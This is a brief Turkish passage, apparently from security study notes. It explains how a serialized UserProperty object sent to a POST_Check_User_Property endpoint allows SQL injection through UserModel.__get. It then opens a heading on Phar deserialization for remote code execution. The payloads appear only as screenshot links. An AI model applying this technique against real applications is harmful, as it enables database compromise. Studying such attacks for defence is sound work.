Sorun, serialized 'miş UserProperty nesnesini POST_Check_User_Property endpoint aracılığıyla sağlayabilmemiz ve böylece UserModel.__get'te çalıştırılacak sorguyu kontrol ederek SQL enjeksiyonuna yol açabilmemizdir

![Pasted image 20241211185301.png](/img/user/resimler/Pasted%20image%2020241211185301.png)
![Pasted image 20241211185307.png](/img/user/resimler/Pasted%20image%2020241211185307.png)

Bu örnek için, SQL enjeksiyon saldırısını şu şekilde gerçekleştirebiliriz:

![Pasted image 20241211185321.png](/img/user/resimler/Pasted%20image%2020241211185321.png)

Bunu çalıştırmak enjeksiyonun çalıştığını kanıtlar:

![Pasted image 20241211185342.png](/img/user/resimler/Pasted%20image%2020241211185342.png)



### RCE: Phar Deserialization